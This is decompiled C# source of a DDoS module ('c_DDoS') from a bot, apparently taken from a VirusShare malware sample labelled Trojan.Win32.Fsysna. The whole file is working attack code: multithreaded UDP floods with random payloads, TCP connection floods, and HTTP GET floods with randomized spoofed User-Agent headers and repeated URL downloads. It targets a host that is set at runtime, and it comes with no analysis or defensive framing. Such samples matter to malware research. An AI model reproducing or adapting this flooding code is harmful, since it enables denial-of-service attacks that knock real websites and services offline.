// Decompiled with JetBrains decompiler
// Type: Stub.c_DDoS
// Assembly: Bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 85CBEE6D-9173-48CF-9DE2-C5D6EFA84893
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Fsysna.dosu-c8b1b84f43bfbe7a69a68cc22f61d7b748661a1fe24c157f43f282f251b83c42.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Stub
{
  internal class c_DDoS
  {
    public static string s_Host = "";
    public static int i_Interval = 1;
    public static int i_Threads = 1;
    public static int i_Sockets = 1;
    public static int i_PacketSize = 1;
    public static int i_Port = 0;
    private static ThreadStart[] floodingJob;
    private static Thread[] floodingThread;
    private static string s_Traffic = "";
    public static bool b_Flood = false;
    public static int i_DDoSType = 0;
    public static string s_URL = string.Empty;
    private static string[] userAgents = new string[28]
    {
      "(compatible; MSIE 6.0; Windows NT)",
      "(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5",
      "(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ",
      "(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
      "[en] (WinNT; U)",
      "(compatible; MSIE 7.0; Windows NT 5.1; bgft) ",
      "(compatible; MSIE 6.0; Win32)",
      "(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
      "(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801",
      "(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
      "(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ",
      "(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0",
      "(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ",
      "(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6",
      "Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326",
      "(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50",
      "(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
      "(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10",
      "(Macintosh; PPC Mac OS X; U; en) Opera 8.0",
      "(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
      "(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
      "(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3",
      "(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)",
      "(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
      "(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
      "(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
      "(compatible; MSIE 6.1; Windows XP)",
      "(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
    };
    private static string[] browsers = new string[10]
    {
      "Mozilla/3.0 ",
      "Mozilla/3.1 ",
      "Mozilla/3.6 ",
      "Mozilla/4.0 ",
      "Mozilla/4.08 ",
      "Mozilla/5.0 ",
      "Opera/9.33 ",
      "Opera/9.0 ",
      "Opera/8.90 ",
      "Opera/9.80 "
    };

    public static void Start()
    {
      c_DDoS.b_Flood = true;
      c_DDoS.floodingThread = new Thread[c_DDoS.i_Threads];
      c_DDoS.floodingJob = new ThreadStart[c_DDoS.i_Threads];
      for (int index = 1; index < c_DDoS.i_Threads; ++index)
      {
        c_DDoS.floodingJob[index] = new ThreadStart(c_DDoS.DDoS);
        c_DDoS.floodingThread[index] = new Thread(c_DDoS.floodingJob[index]);
        c_DDoS.floodingThread[index].Start();
      }
    }

    public static void Stop() => c_DDoS.b_Flood = false;

    private static void ConnectCallback(IAsyncResult ar)
    {
      Socket asyncState = (Socket) ar.AsyncState;
      try
      {
        switch (c_DDoS.i_DDoSType)
        {
          case 0:
            asyncState.EndConnect(ar);
            asyncState.Send(c_DDoS.udpRandom());
            Thread.Sleep(c_DDoS.i_Interval);
            asyncState.Close();
            break;
          case 1:
            asyncState.EndConnect(ar);
            Thread.Sleep(c_DDoS.i_Interval);
            asyncState.Close();
            break;
          case 2:
            asyncState.EndConnect(ar);
            string s = "GET / HTTP/1.1" + Environment.NewLine + "Host: http://" + c_DDoS.s_Host + Environment.NewLine;
            asyncState.Send(Encoding.Default.GetBytes(s));
            Thread.Sleep(c_DDoS.i_Interval);
            asyncState.Close();
            break;
          case 3:
            asyncState.EndConnect(ar);
            asyncState.Send(c_DDoS.GenerateRequest());
            Thread.Sleep(c_DDoS.i_Interval);
            asyncState.Close();
            break;
        }
      }
      catch
      {
      }
    }

    private static void DDoS()
    {
      while (c_DDoS.b_Flood)
      {
        Socket[] socketArray = new Socket[c_DDoS.i_Sockets];
        for (int index = 1; index < c_DDoS.i_Sockets; ++index)
        {
          switch (c_DDoS.i_DDoSType)
          {
            case 0:
              try
              {
                if (c_DDoS.i_Port <= 0)
                  c_DDoS.i_Port = new Random().Next(80, 64000);
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(c_Network.GetIPByHost(c_DDoS.s_Host)), c_DDoS.i_Port);
                socketArray[index] = new Socket(remoteEP.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
                socketArray[index].BeginConnect((EndPoint) remoteEP, new AsyncCallback(c_DDoS.ConnectCallback), (object) socketArray[index]);
                break;
              }
              catch
              {
                break;
              }
            case 1:
              try
              {
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(c_Network.GetIPByHost(c_DDoS.s_Host)), 80);
                socketArray[index] = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                socketArray[index].BeginConnect((EndPoint) remoteEP, new AsyncCallback(c_DDoS.ConnectCallback), (object) socketArray[index]);
                break;
              }
              catch
              {
                break;
              }
            case 2:
              try
              {
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(c_Network.GetIPByHost(c_DDoS.s_Host)), 80);
                socketArray[index] = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                socketArray[index].BeginConnect((EndPoint) remoteEP, new AsyncCallback(c_DDoS.ConnectCallback), (object) socketArray[index]);
                break;
              }
              catch
              {
                break;
              }
            case 3:
              try
              {
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(c_Network.GetIPByHost(c_DDoS.s_Host)), 80);
                socketArray[index] = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                socketArray[index].BeginConnect((EndPoint) remoteEP, new AsyncCallback(c_DDoS.ConnectCallback), (object) socketArray[index]);
                break;
              }
              catch
              {
                break;
              }
            case 4:
              try
              {
                new WebClient[c_DDoS.i_Sockets][index].DownloadData(c_DDoS.s_URL);
                Thread.Sleep(c_DDoS.i_Interval);
                break;
              }
              catch
              {
                break;
              }
          }
        }
      }
    }

    private static byte[] udpRandom()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1, c_DDoS.i_PacketSize)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] tcpRandom()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, (int) ushort.MaxValue)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] GenerateRequest()
    {
      Random random = new Random();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("GET / HTTP/1.1");
      stringBuilder.AppendLine("Host: " + c_DDoS.s_Host);
      stringBuilder.AppendLine("User-Agent: " + c_DDoS.browsers[random.Next(0, c_DDoS.browsers.Length - 1)] + " " + c_DDoS.userAgents[random.Next(0, c_DDoS.userAgents.Length - 1)]);
      stringBuilder.AppendLine("Content-Length: " + random.Next(1, 1000).ToString());
      stringBuilder.AppendLine("X-a: " + random.Next(1, 10000).ToString());
      stringBuilder.Append("Connection: keep-alive");
      return Encoding.ASCII.GetBytes(stringBuilder.ToString());
    }
  }
}
